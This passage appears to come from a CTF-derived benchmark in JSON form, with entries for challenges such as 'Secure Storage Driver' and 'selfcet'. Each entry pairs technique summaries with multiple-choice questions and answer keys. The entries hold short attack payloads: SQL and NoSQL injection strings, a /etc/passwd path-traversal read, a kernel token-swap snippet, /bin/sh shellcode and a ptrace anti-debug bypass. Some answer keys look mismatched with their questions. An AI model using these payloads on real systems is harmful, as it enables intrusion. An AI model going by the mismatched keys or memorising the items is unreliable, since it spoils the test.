            "When attempting to decrypt an encrypted file within a mobile application using AES encryption and knowing the encryption key is generated by repeating a user's 4-digit PIN code four times, what is the correct method to initialize the encryption key for the decryption process?  - A. Use a complex hashing function on the PIN code before using it as a key. - B. Directly use the PIN code as the AES encryption key without modification. - C. **Convert the repeated PIN code to bytes and use it as the key for AES encryption.** - D. Encrypt the PIN code with another layer of encryption before using it as the AES key. ",
            "In a scenario where a decrypted database file is expected to contain JSON data with a key named \"notes\", what is the correct way to verify that the decryption process was successful?  - A. Check if the file size increases after decryption. - B. **Confirm the presence of the \"notes\" key in the decrypted content.** - C. Compare the decrypted file's checksum with the original encrypted file's checksum. - D. Attempt to execute SQL queries against the decrypted file to verify its integrity. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Secure Protocol",
        "write_up": "dataset/raw/Secure Protocol.md",
        "type": "crypto",
        "competition": [
            "S4CTF/2021",
            "https://ctftime.org/event/1329/tasks/"
        ],
        "score": 423,
        "max_score": 500,
        "difficulty": 0.846,
        "knowledge": [
            "When facing a challenge that involves SHA-1 and the goal is to find a hash collision where a message includes different but operationally equivalent salts, utilizing base64 encoding allows for the manipulation of salts without altering their decoded value. This can be useful in scenarios where constraints require the input (e.g., salts) to be technically different but functionally identical after decoding. This approach leverages the property that base64 encoding can be padded with `=` without changing the encoded value, thus satisfying the requirement for different inputs leading to the same operational outcome. To apply this knowledge, if given `salt1` base64 encoded, you can add `=` at the end to create `salt1'`, ensuring `salt1 != salt1'` while the base64 decoded value remains unchanged.",
            "In scenarios requiring a hash value of an extended string where modification of the original salts or messages is restricted or closely monitored, a length extension attack can be effective. This attack takes advantage of the way hashing algorithms like SHA-1 process message chunks and allows an attacker to append new data (`s3` in this context) to the original hash (`h`) without needing to know the entire original message (`salt1 + msg + salt2`). This method is notably relevant when the attacker can influence the suffix of the message and knows the hash of the original message. This technique aligns with the mechanism described in cryptographic exchanges and can be particularly useful in extending given cryptographic messages under certain constraints. \n\nSample payload for base64 padding (conceptual, no executable payload provided): If `salt1` is encoded, appending `=` would change its base64 representation to `salt1'`, thus satisfying a change in input while keeping the decoded output constant. \n\nLength extension attack example payload cannot be specifically provided without detailed context or parameters for execution."
        ],
        "question": [
            "In a scenario where you are given a base64 encoded `salt1` for creating a hash and must change `salt1` without changing its decoded value to bypass a specific constraint in a cryptographic challenge, how would you modify `salt1`? - A. Change the encoding of `salt1` to UTF-8. - B. Append a character to `salt1` before encoding. - C. Append `=` to the end of `salt1`. - D. Reverse the order of characters in `salt1`.",
            "When attempting to perform a length extension attack on a SHA-1 hashed message where you have the hash of `salt1 + msg + salt2` and wish to append `s3` to the original message, what do you not need to know to successfully carry out the attack? - A. The full contents of `msg`. - B. The hash of the original message (`h`). - C. The exact value of `salt2`. - D. The exact value of `salt1`."
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Secure Safe",
        "write_up": "dataset/raw/Secure Safe.md",
        "type": "The types of challenges in this CTF write-up are:\n- Mobile",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When analyzing Android applications for hidden or hard-coded information, extracting and examining the contents of APK files can reveal data not readily visible through the application interface itself. This can include searching for strings within different file types that are part of the APK package, such as .xml, .dex, or .arsc files. Common commands used in this process include `grep -R` to recursively search for patterns like \"flag\" and `strings` to print the sequences of printable characters in files.\n    - Example command to search within .arsc files: `strings resources.arsc | grep flag`\n    - Example command to search within .dex files: `strings classes.dex | grep flag`",
            "For Android applications employing simple encryption schemes based on inputs like a PIN, decompiling the APK to review the source code can allow the identification of encryption methodologies and hardcoded secrets (e.g., keys or salts). Once understood, custom scripts or programs can be written to emulate the encryption or decryption process, providing a method for brute-forcing or systematically guessing the required input to reveal the encrypted data.\n    - Scenario: An application encrypts data based on a user input (e.g., a PIN) and a hardcoded secret. After decompiling the APK and reviewing the source code, identify the encryption process and write a script to emulate it. The script iteratively tests possible inputs (like all 4-digit PINs) to find the correct input that decrypts the hidden data, revealing the flag.\n    - Example Java snippet to test all 4-digit PINs:\n        ```java\n        for (int id = 0; id <= 9999; id++) {\n            String pin = String.format(\"%04d\", id);\n            // Assuming `doInBackground` mimics the app's decryption logic\n            String flag = (String)doInBackground(new String [][]{{encrypted_flag, pin}});\n            if (flag.startsWith(\"flag{\"))\n                System.out.println(\"PIN: \" + pin + \" -> \" + flag);\n        }\n        ```"
        ],
        "question": [
            "When conducting a forensic analysis on an Android APK file for potential secure information breaches, which command can be effectively used to search for hardcoded flags in the .arsc file? - A. `cat resources.arsc | grep flag` - B. `ls -la | grep flag` - C. `find . -name \"flag\"` - D. `strings resources.arsc | grep flag` ",
            "Given the scenario of decrypting data in an Android application where the data is encrypted using a 4-digit PIN and a hardcoded secret, which approach best describes the method to brute-force the encryption to reveal the hidden flag? - A. Run a network sniffer to capture the encryption keys during API communication. - B. Use a decompiler to analyze the source code and write a script that iteratively tries all possible 4-digit PIN combinations until the encrypted data is decrypted. - C. Install the application on multiple devices and manually enter every possible PIN combination. - D. Reverse engineer the application's binary file to directly extract the encrypted flag. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Secure Secret Sharing",
        "write_up": "dataset/raw/Secure Secret Sharing.md",
        "type": "web",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 300,
        "max_score": 1337,
        "difficulty": 0.2243829468960359,
        "knowledge": [
            "When exploiting NoSQL injection vulnerabilities, if direct querying does not yield useful results due to limitations (e.g., only one entry returned or specific sequence issues), consider using MongoDB query operators like `$regex` for pattern matching or `$not` in combination with `$regex` to exclude known non-target entries. This approach helps iteratively narrow down the search space when looking for specific entries, such as flags in a database. To deal with long URI issues during this process, it may be necessary to find alternative querying strategies that do not require sending very long request URIs.\n   \n   Example payload for initial narrowing down: `?secid[$regex]=^`\n   \n   Example payload for excluding known non-target hashes: `?secid[$not][$regex]=hash1|hash2|hash3|...`",
            "In scenarios where the dataset is large and not easily enumerable through direct queries, conceptualize the problem domain differently to find an efficient solution. By visualizing the hashes as a tree structure, it becomes possible to apply tree traversal techniques to systematically explore each branch (in this case, each possible hash) until the target data is found. This approach is particularly useful when dealing with cryptographic hash functions that produce output which doesn't linearly correlate to the input, making sequential searches impractical. Parallelizing the traversal process can significantly speed up the search.\n\n   In the context of CTF challenges or similar problem sets involving large datasets or hashes, applying computer science fundamentals like tree structures and traversal algorithms can uncover unconventional yet effective solutions."
        ],
        "question": [
            "In a web application vulnerable to NoSQL injection, you need to enumerate entries in a MongoDB database but encounter limitations with direct queries. Given the restriction of long URIs when attempting to exclude already known non-target entries, which of the following MongoDB query operators could be efficiently used to initiate the process of excluding known hashes? - A. `?secid[$eq]=hash` - B. `?secid[$gte]=hash` - C. `?secid[$lt]=hash` - D. `?secid[$not][$regex]=hash1|hash2|hash3|...`",
            "In a scenario involving a large set of hash values that must be efficiently searched through to find a specific entry, you decide to apply a tree traversal strategy to optimize the search process. This decision follows realizing that direct enumeration methods are impractical due to the size of the dataset and the non-linear nature of cryptographic hash output. Which computer science concept is being applied to redefine and approach the problem in a more manageable way? - A. Stack-based memory allocation - B. Hash table lookups - C. Tree structures and traversal algorithms - D. Linear search algorithms"
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Secure Storage Driver",
        "write_up": "dataset/raw/Secure Storage Driver.md",
        "type": "pwn",
        "competition": [
            "CCCamp/2023",
            "https://ctftime.org/event/2048/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting Windows kernel vulnerabilities, especially those involving drivers with IOCTL (Input Output Control) interfaces, the key step is to identify handlers for specific IOCTL requests. These handlers may directly or indirectly allow for arbitrary read/write operations in kernel space due to inadequate validation of input parameters such as offsets or lengths. Attackers can leverage these vulnerabilities to modify kernel data structures, potentially elevating their privileges. For exploitation, calculate offsets carefully to convert virtual kernel addresses to those relative to a controllable space (like an allocated pool) for read or write operations.\n\nExample payload components for arbitrary read (Python):\n```python\ndef read_at_va(va: int, secret_store_base: int) -> int:  \n   return read_at(va - secret_store_base)\n```",
            "In Windows kernel exploitation, obtaining the address of the `EPROCESS` structure of the target process and manipulating its `Token` field is a common technique for privilege escalation. By replacing the `Token` of a low-privileged process with that of a system process (e.g., by finding `EPROCESS` via `PsInitialSystemProcess` and traversing `ActiveProcessLinks`), an attacker can execute code with elevated privileges. This technique is crucial for post-exploitation stages that require higher privileges to perform actions like reading protected files.\n\nExample payload components for token swapping (Python):\n```python\nsystem_token = read_at_va(PsInitialSystemProcess + Token_off)  \nwrite_to_va(target_eprocess + Token_off, system_token)\n```"
        ],
        "question": [
            "When exploiting Windows kernel vulnerabilities via IOCTL interfaces in drivers, which operation is crucial for leveraging arbitrary read/write capabilities?  - A. Modifying IOCTL request codes to bypass driver signature checks. - B. Calculating offsets to convert virtual kernel addresses to those relative to a controllable space for read or write operations. - C. Using stack overflow techniques to hijack the kernel execution flow. - D. Encrypting payload data to avoid detection by security mechanisms. ",
            "In the context of Windows kernel exploitation, what is a critical step for privilege escalation involving the manipulation of an EPROCESS structure?  - A. Decrypting the EPROCESS structure to expose hidden fields. - B. Calculating the exact size of the EPROCESS structure to avoid memory corruption. - C. Replacing a process's Token with that of a system process for elevated privileges. - D. Patching the kernel version information to bypass version checks. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Secure System",
        "write_up": "dataset/raw/Secure System.md",
        "type": "This write-up describes a SQL Injection challenge where the author explores various techniques to exploit the vulnerability present in the application. The challenge involves understanding SQL syntax, bypassing filters, and ultimately retrieving the flag using SQL injection techniques.\n\nBased on the content provided, the type of this CTF challenge can be categorized as **web**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing server-side template injection (SSTI) or SQL injection challenges with strict word filtering, utilizing alternative logical operators can bypass blacklist filters. If common operators like `and`, `or` are filtered, alternatives like `&&` for AND and `||` for OR can be used effectively to test for vulnerabilities. Example payload to check SQL Injection: `id=2 %26%26 1=1`. This technique demonstrates that different syntax can achieve the same logical operations, thus bypassing naive or simple blacklist-based input filtering mechanisms.",
            "Exploiting PHP's PCRE (Perl Compatible Regular Expressions) backtracking limit errors can assist in bypassing regex-based input validations or filters in web applications, particularly in union-based SQL injection scenarios. If the application uses `preg_match()` for input validation, submitting a payload that causes the regex engine to exceed its backtracking limit (`pcre.backtrack_limit`) will not match, thus bypassing the validation. This method takes advantage of PHP configuration limits and regex engine limitations to circumvent input validation. An example bypass utilizes a long sequence of a repeated character to exceed these limits, as shown: `union/*'+'a'*1000000+'*/select 1,2,3-- -`."
        ],
        "question": [
            "When employing logical operators in SQL injection attacks, what alternative syntax can be used to bypass filtering of the `and` keyword? - A. Use \"++\" instead of \"and\" - B. Use \"&&\" instead of \"and\" - C. Replace \"and\" with \"++&&\" - D. Enclose \"and\" within quotes to bypass filtering",
            "In a challenge involving bypassing PHP regex-based input validation with a payload designed to exploit the PCRE backtracking limit, which of the following payloads successfully exploits this behavior to manage a union-based SQL injection? - A. `'union/*'+'b'*2000000+'*/select 1,2,3-- -'` - B. `'union/--+'a'*1000000+'select 1,2,3-- -'` - C. `'union/*'+'a'*1000000+'*/select 1,2,3-- -'` - D. `'select/*'+'a'*500000+'*/1,2,3 from dual-- -'`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "secure-hash",
        "write_up": "dataset/raw/secure-hash.md",
        "type": "crypto",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 269,
        "max_score": 500,
        "difficulty": 0.538,
        "knowledge": [
            "When facing a system that utilizes hashes to verify credentials, and where the input concatenated before hashing is not properly separated (e.g., username and password concatenated directly), an attacker can exploit this by registering with a slightly modified username and a password that, when concatenated, equals the intended username concatenated with its corresponding password. This is because the hash function (e.g., SHA512) will produce the same output for identical input strings, allowing unauthorized access as the hash stored matches the hash of the manipulated inputs. This approach requires that the system does not enforce unique or isolated input handling mechanisms to prevent such concatenation attacks.\n   \n   Example payload: Registering with username `userA` and password `pass` can potentially allow unauthorized access to a `user` account with password `Apass` if the system concatenates inputs directly before hashing.",
            "In environments where direct input (e.g., `root` username) is blocked or filtered, one can bypass such restrictions by exploiting the system's handling of input concatenation to manipulate hash values for authentication. By strategically adding characters to the end of a restricted username and adjusting the password to include these characters at its beginning, attackers can create a condition where the hash computation remains unaffected, thus bypassing input restrictions without directly confronting security controls.\n\n   Example payload: Register as `rootA` with password `Bpassword` and attempt to log in as `root` with password `ABpassword` to exploit unrestricted hash comparison for authentication bypass, assuming the system concatenates username and password directly and compares their hash against stored values."
        ],
        "question": [
            "In a CTF challenge involving a login mechanism, the system concatenates the username and password directly before computing their hash to verify credentials. If one wants to log in as the user \"admin\" but the registration of \"admin\" is blocked, which of the following strategies would successfully bypass this security measure using the described vulnerability?  - A. Register as \"admin1\" with the password \"234\", then log in as \"admin\" with the password \"1234\". - B. Register as \"user\" with the password \"admin\", then log in as \"admin\" with an empty password. - C. Directly attempt to log in as \"admin\" with a guessed password. - D. Register and log in as \"admin\" directly without any manipulation. ",
            "In a security mechanism where direct registrations of certain usernames (e.g., \"root\") are not allowed, and the authentication process involves concatenating the username and password before hashing them together without separating characters, which approach would allow an attacker to bypass the username restriction and authenticate as \"root\"?  - A. Register as \"root \" (root followed by a space) with any password, and log in as \"root\" with the password appended by the space and original password. - B. Register with a reverse concatenation of password and username, then log in with the normal order. - C. Register as \"rootX\" with the password starting with a character that, when added to the root, forms a valid hash. - D. Register as \"toor\" and use a hash collision technique to log in as \"root\". "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "secure",
        "write_up": "dataset/raw/secure.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing client-side input sanitization or validation, it's important to remember that it can often be bypassed through the modification of the HTTP request after it leaves the browser. Tools like Burp Suite can intercept and modify traffic between the client and server, allowing for direct manipulation of request parameters, including those that have been sanitized client-side. This method is particularly useful in web challenges where inputs are encoded (such as base64) or validated in a way that prevents straightforward injection or manipulation.  \nExample payload manipulation: Changing base64 encoded `username=YWRtaW4%3D` into an SQL injection payload in the HTTP request body.",
            "SQL injection can still be performed even if inputs are sanitized or encoded on the client side, by intercepting and modifying HTTP requests before they reach the server. In scenarios where input is base64 encoded to prevent direct SQL injection, decoding the input server-side does not guarantee security. Attackers can inject SQL commands by encoding their payloads into base64, circumventing client-side defenses but successfully exploiting server-side vulnerabilities.  \nExample payload for SQL injection: `' OR 1=1 --` encoded in base64 and then URL encoded if necessary, placed in the intercepted request to exploit server-side SQL injection vulnerabilities."
        ],
        "question": [
            "Which tool can be utilized to bypass client-side input sanitization by intercepting and modifying HTTP requests, as demonstrated in a scenario involving base64 encoding to sanitize inputs? - A. Nmap - B. Wireshark - C. Burp Suite - D. Putty",
            "In a scenario where client-side input is sanitized through base64 encoding, how can an attacker perform an SQL injection? - A. By using MD5 hashing on the input fields - B. By directly inputting SQL code into the input fields without encoding - C. By decoding the base64 encoded input on the server-side - D. By encoding the SQL injection payload into base64 and modifying the HTTP request before it reaches the server"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "SecureCheck",
        "write_up": "dataset/raw/SecureCheck.md",
        "type": "misc",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 330,
        "max_score": 1000,
        "difficulty": 0.33,
        "knowledge": [
            "When facing challenges implementing seccomp filters that restrict system calls, leveraging instructions that are not affected by these filters such as `rdtsc`, `rdtscp`, `rdrand`, or `rdseed` can allow for conditional execution based on unique outcomes of these instructions. These can be used to differentiate code paths between parent and child processes after a `fork()` in scenarios where memory operations in a child do not affect the parent process due to copy-on-write. A practical application of this is to execute different sets of instructions in the parent and child processes based on the randomness or counters provided by these instructions, enabling a bypass of restrictions imposed by seccomp.\n\n    Example payload snippet:\n    ```assembly\n    rdrand eax  \n    and eax, 0x1  \n    cmp ax, 0x1  \n    je SYSCALL\n    ```",
            "In CTF challenges where direct system calls are restricted and identifying the process context (parent or child) is crucial, considering the operational environment like the presence of vDSO (virtual dynamically linked shared object) can guide strategies for bypassing restrictions. Although direct access to vDSO might not be feasible due to cleared register values, using CPU-specific instructions that derive different results on each execution can indirectly achieve execution control. This method is particularly useful in scenarios requiring the execution of certain actions only by either the parent or the child process, not both.\n\n    Example payload continuation:\n    ```assembly\n    SYSCALL:  \n    lea rsp, [rdx+0xf00]  \n    mov rdi, 0x0068732f6e69622f  \n    push rdi  \n    mov rdi, rsp  \n    mov eax, 0x3b  \n    xor esi, esi  \n    xor edx, edx  \n    syscall  \n    ```"
        ],
        "question": [
            "In a scenario where executing different instructions in parent and child processes is necessary due to seccomp restrictions, which among the following instructions could be effectively used to create a conditional execution path that is not hindered by seccomp filters? - A. mov eax, 0x1 - B. int 0x80 - C. rdrand eax - D. jmp SYSCALL ",
            "When employing assembly instructions to bypass limitations in a context where system calls are restricted by seccomp, and distinguishing between parent and child processes is vital, which of the following instructions serves as a practical approach to control execution flow by utilizing architectural features (like CPU randomness or counters) not governed by seccomp? - A. sysenter - B. rdrand eax - C. syscall - D. in eax, dx "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "security_question",
        "write_up": "dataset/raw/security_question.md",
        "type": "This write-up corresponds to a **web** challenge.",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": 100,
        "max_score": 666,
        "difficulty": 0.15015015015015015,
        "knowledge": [
            "In web application vulnerabilities related to insecure file handling, if the application concatenates user input directly to form file paths, it can be exploited by supplying an absolute path or using path traversal characters to access arbitrary files. This can be mitigated by validating and sanitizing user input before using it in file system operations. \n   - Example payload for absolute path exploitation: `/getpoem?name=/etc/passwd`\n   - Example payload for directory traversal (although blocked in the given scenario): `/getpoem?name=../../hidden_poem.txt`",
            "The behavior of Python's `os.path.join()` function can lead to security vulnerabilities if not properly understood and handled. Specifically, if an absolute path is supplied as one of the arguments, any paths before it are disregarded, which can lead to unintended file access if user input is included unchecked.\n   - Example usage in a secure scenario: Ensure user input never starts with a slash (`/`) or if it does, the input should be sanitized to prevent absolute path exploitation."
        ],
        "question": [
            "In a web application, if user input is directly used to concatenate file paths, how can this vulnerability be exploited to access arbitrary files outside the intended directory? - A. By sending a regex pattern as the file name. - B. By using an absolute path in the input, such as `/etc/passwd`. - C. By encrypting the desired file path and sending it as input. - D. By sending a large number of requests to overload the file system. ",
            "Considering the peculiar behavior of Python's `os.path.join()` function, which of the following measures is effective in preventing absolute path exploitation when handling user-supplied file paths? - A. Using a regex to restrict file names to alphanumeric characters. - B. Prepending all user inputs with a fixed directory path inside the application. - C. Sanitizing the user input by ensuring it does not start with a slash (`/`) or sanitizing such inputs. - D. Encrypting user inputs before passing them to `os.path.join()`. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "seed",
        "write_up": "dataset/raw/seed.md",
        "type": "The type of this challenge is `reverse`.",
        "competition": [
            "DamCTF/2021",
            "https://ctftime.org/event/1401/tasks/"
        ],
        "score": 249,
        "max_score": 499,
        "difficulty": 0.49899799599198397,
        "knowledge": [
            "When dealing with pseudorandom number generators (PRNGs), using the current time as a seed could lead to predictable outputs, which compromises the security of generated values. This is important for cryptographic applications, where unpredictability is crucial. In the context of reverse engineering challenges, if the seed for a PRNG is based on a predictable value like the current time, it\u2019s possible to recreate the PRNG's state at the time of the flag's generation by iterating through time values near the creation time until the output matches logged or known wrong attempts.",
            "To reverse-engineer or crack a PRNG-based system, one could adjust the seed in a predictable manner to reproduce the PRNG's state at a certain point. This involves manipulating the seed value in a controlled way, such as decrementing the seed value based on current time to traverse backwards towards the PRNG state when a specific output was generated. By iterating over seed values, starting from a known point and moving in the direction that leads to the state when the desired output was produced, it's possible to find the exact output that includes the flag or other secrets.\n   \n   Sample adjustment in Python for a backtrack approach:\n   ```\n   s = seed()  # Get the current time-based seed\n   while s > 0:\n       s = s - 1\n       # PRNG operations with s as the seed...\n   ```"
        ],
        "question": [
            "In a Python script for a CTF challenge, a pseudorandom number generator (PRNG) uses the current system time as a seed. Given the way the seed is generated as `round(time.time())`, why could this approach compromise the security of the values generated by the PRNG in cryptographic applications? - A. Because the use of the system's time zone in the seed makes the PRNG outputs culturally insensitive. - B. Because floating-point arithmetic used in generating the seed introduces too much randomness. - C. Because using the rounded system time as a seed makes the PRNG outputs unpredictable and enhances security. - D. Because the predictability of the seed based on the current time could allow attackers to reproduce the PRNG's state and predict future outputs.",
            "When trying to reverse-engineer a PRNG-based system in a cybersecurity challenge, a suggested method involves decrementing the seed value to backtrack to a specific state. Given the context of modifying a script to decrement the seed starting from the current time, what is the purpose of this approach? - A. To increase the randomness of the PRNG by exploring more seed values. - B. To find the exact seed value used at the time of flag generation by iterating backward through seed values starting from the current time. - C. To synchronize the PRNG with real-world time for accurate timestamping of generated values. - D. To optimize the performance of the PRNG by reducing the range of potential seed values."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "selfcet",
        "write_up": "dataset/raw/selfcet.md",
        "type": "pwn",
        "competition": [
            "SECCON/2023/Quals",
            "https://ctftime.org/event/2003/tasks/"
        ],
        "score": 136,
        "max_score": 500,
        "difficulty": 0.272,
        "knowledge": [
            "When faced with the necessity to bypass Control Flow Integrity (CFI) protections such as Intel's Control Flow Enforcement Technology (CET) in a binary compiled without Position Independent Executable (PIE) and lacking a Procedure Linkage Table (PLT), function pointer overwriting can be leveraged to redirect the execution flow. This can be achieved by partially overwriting the least significant bytes of a vulnerable function pointer to point to a different eligible function within libc or the given binary. The conditions for applying this technique include having a known binary base address, the absence of PIE, and a writable function pointer. An instance of partial overwrite could involve altering a function pointer to point to a useful function like `warn` that is close enough to the originally pointed function (`err`) within libc. This approach assumes that the overwrite does not alter the upper bytes, keeping the address within the target function's vicinity.",
            "Exploiting a buffer overflow by injecting specific actions (such as read or write operations) into a program's workflow can be an effective approach when direct exploitation methods (e.g., one_gadget) are impractical due to CFI protections or limitations in writable memory range (e.g., function addresses not fitting into an `int`). Under these constraints, one useful strategy involves leveraging the `atexit()` function to create a loop back to the program\u2019s `main()` function, thereby allowing for multiple writes or reads, which can overcome the limitation of a single buffer overflow opportunity. This method can enable an attacker to prepare the environment (e.g., writing a \"/bin/sh\" string into `.bss`) before executing the desired exploit (e.g., calling `system(\"/bin/sh\")`). Conditions for this technique's applicability include the ability to execute arbitrary functions and the necessity to perform multiple actions to set up the exploit.\n   \nExample payload for looping back to `main()`: `atexit(main)`"
        ],
        "question": [
            "In a cybersecurity challenge involving bypassing Control Flow Integrity (CFI) protections such as Intel's Control Flow Enforcement Technology (CET), participants are given a binary without Position Independent Executable (PIE) and lacking a Procedure Linkage Table (PLT). The task involves leveraging a buffer overflow vulnerability to overwrite a function pointer. Given that the binary's base address is known (0x400000), and the targeted vulnerable function pointer initially points to a function `err` within libc, which approach would allow you to redirect the executable flow to another libc function located close to `err`?  - A. Use a brute-force attack to guess the new address of the `warn` function. - B. Partially overwrite the least significant bytes of the pointer to point to the `warn` function, assuming the overwrite keeps the address within a close range. - C. Fully overwrite the entire pointer with the absolute address of a completely unrelated function in the binary. - D. Encrypt the binary to bypass the CFI protections automatically. ",
            "In the same challenge, capturing the flag requires multiple specific actions due to constraints like CFI protections and limited writable memory range. Since direct methods like executing a one_gadget command are not feasible, another strategy is needed for successful exploitation. Considering these constraints, which strategy could be utilized to execute multiple arbitrary writes or operations, enabling the setup required for the final exploit?  - A. Use the `free()` function to randomly jump back to the `main()` function and hope for a lucky break. - B. Overwrite global offset table (GOT) entries to redirect standard C library functions to `main()`. - C. Employ the `atexit()` function to register `main()` itself as an exit function, causing the program to loop back to `main()` upon termination. - D. Modify environment variables to trick the program into restarting itself. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Shall we play a game_",
        "write_up": "dataset/raw/Shall we play a game_.md",
        "type": "The type of challenge described in the write-up is a crypto challenge.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When tackling challenges involving a repetitive task to reveal the flag, such as winning a game a large number of times, an effective approach is to understand and replicate the underlying logic or algorithm of the task programmatically rather than manually engaging in the task. This entails decompiling the app (if it's an Android APK, for example), analyzing the code for any methods related to the win condition, and scripting the process, which can be done by directly invoking these methods in a loop within a modified version of the app or a separate script.",
            "In challenges where cryptographic operations are involved and you have control over or access to some elements of the process (like the initial state of a random number generator, or the input/output of cryptographic functions), programming a sequence of operations akin to those found in the challenge (like hashing a value a million times, or decrypting data with a cipher key derived from specific operations) can unlock the solution. Essential knowledge in cryptographic algorithms (SHA-256 for hashing, AES/ECB for encryption/decryption, etc.) and their implementations in standard libraries (Java, in this case) are critical. Utilize common libraries and functions to mirror the cryptographic process described in the challenge to compute the flag.\n   - Sample cryptographic operation in pseudo-code/java:\n     ```java\n     MessageDigest messageDigest = MessageDigest.getInstance(\"SHA-256\");\n     messageDigest.update(inputBytes);\n     byte[] hash = messageDigest.digest();\n     \n     Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n     SecretKeySpec keySpec = new SecretKeySpec(keyBytes, \"AES\");\n     cipher.init(Cipher.DECRYPT_MODE, keySpec);\n     byte[] result = cipher.doFinal(encryptedBytes);\n     ```"
        ],
        "question": [
            "In a challenge that requires winning a game a specific number of times to obtain a flag, one approach is to automate the process of winning. Given that you have decompiled the source code from an Android APK and found methods responsible for handling the win process in a game, how can you programmatically achieve the required win count without manually playing the game? - A. Manually win the game the specified number of times. - B. Modify the game's graphical interface to display the flag. - C. Directly invoke the win method in a loop to programmatically increment the win counter. - D. Change the game's settings to lower the win count requirement.",
            "During the analysis of a capture the flag (CTF) challenge, you uncover a section of Java code that applies cryptographic transformations to a sequence of data. Assuming you have the initial bytes array and a specific byte array to end with, which cryptographic technique should you use to replicate the sequence of operations programmatically to derive the final output as per the challenge's requirements? - A. Utilize a symmetrical encryption algorithm without the need for hashing. - B. Apply the RSA encryption algorithm directly on the byte array. - C. Perform a series of SHA-256 hashing operations followed by an AES/ECB decryption. - D. Encode the initial byte array with Base64 encoding rather than applying cryptographic functions."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "shallweplayagame",
        "write_up": "dataset/raw/shallweplayagame.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 476,
        "max_score": 497,
        "difficulty": 0.9577464788732394,
        "knowledge": [
            "When reversing a binary with anti-debug techniques in place, one effective method to bypass a `ptrace`-based anti-debug check is to use GDB to catch `ptrace` syscall execution, forcing the register values to nullify the effect of the `ptrace` check. A program attempting to use `ptrace` with `PTRACE_TRACEME` to detect debugging could be fooled into thinking it is not being debugged by setting the `rax` register to `0` right after the syscall is caught, which essentially makes the `ptrace` call unsuccessful from the program's perspective, allowing the debug session to continue. This technique is particularly useful in scenarios where the program employs simple anti-debugging tactics to deter a straightforward debugging approach.\n   \n   Example GDB commands to bypass ptrace:\n   ```\n   (gdb) catch syscall ptrace\n   (gdb) set $rax = 0\n   (gdb) continue\n   ```",
            "In challenges where input validation checks are performed using mathematical operations or string comparisons, analyzing the comparison logic or breakpoints before comparison-related functions (like `strcmp`, `strncmp` in string checks) can reveal the expected input directly or indirectly. For mathematical operation-based checks, reverse-engineering the calculation allows determining the exact input needed to pass the check. For string comparison-based checks, setting a breakpoint right before the comparison function call and inspecting the comparison function's arguments can help discover the expected string, bypassing the need for guesswork or brute-forcing inputs.\n\n   Example insights for overcoming input validation checks:\n   \n   - For mathematical validation: If a user's input multiplied by a specific number must equal a known value, reverse-engineering the condition reveals the expected input.\n   - For string comparison validation: Setting a breakpoint on `strncmp` and inspecting the arguments (`$rdi`, `$rsi` registers in x64 architecture) to find out the expected string input directly from the memory."
        ],
        "question": [
            "In a scenario where a program uses a `ptrace`-based anti-debugging technique to prevent debugging, which GDB commands sequence effectively bypasses the `ptrace` call, allowing the debugger to attach and continue the session?  - A. ``` (gdb) break ptrace (gdb) set $rdi = 0 (gdb) continue ``` - B. ``` (gdb) catch syscall ptrace (gdb) set $rax = 0 (gdb) continue ``` - C. ``` (gdb) trace ptrace (gdb) set $rip = 0 (gdb) continue ``` - D. ``` (gdb) hook-stop ptrace (gdb) set $rbx = 0 (gdb) continue ```",
            "During a reverse engineering challenge, which strategy is effective for discovering the expected string input to pass a comparison-based input validation if the validation uses `strncmp` to compare user input against a predetermined string?  - A. Hex-edit the binary to replace all instances of `strncmp` with `nop` instructions, then run the program. - B. Set a breakpoint at the start of the program and step through each instruction until `strncmp` is called. - C. Use a dynamic analysis tool to monitor all strings in memory and manually check each one against the user's input. - D. Set a breakpoint on `strncmp`, run the program to this breakpoint, and inspect the comparison function's arguments (`$rdi`, `$rsi` on x64) to extract the expected string input. "
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "Shamir's Stingy Sharing",
        "write_up": "dataset/raw/Shamir's Stingy Sharing.md",
        "type": "crypto",
        "competition": [
            "RaRCTF/2021",
            "https://ctftime.org/event/1342/tasks/"
        ],
        "score": 200,
        "max_score": 1500,
        "difficulty": 0.13333333333333333,
        "knowledge": [
